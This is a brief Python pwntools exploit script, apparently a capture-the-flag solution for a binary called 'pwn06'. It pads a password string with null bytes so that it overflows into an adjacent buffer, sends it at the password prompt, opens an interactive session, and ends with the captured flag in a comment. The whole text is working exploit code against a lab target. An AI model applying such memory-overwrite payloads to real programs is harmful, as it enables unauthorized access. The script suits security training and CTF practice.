from pwn import *
p = process('./pwn06')
elf = ELF('./pwn06')

# gdb.attach(p)

payload  = '12345'.ljust(128, '\0') + '12345\0'
print payload

p.recvuntil("Enter password ...")
p.sendline(payload)

p.interactive()

# WhiteHat{G1v3_m3_a_cl4b}
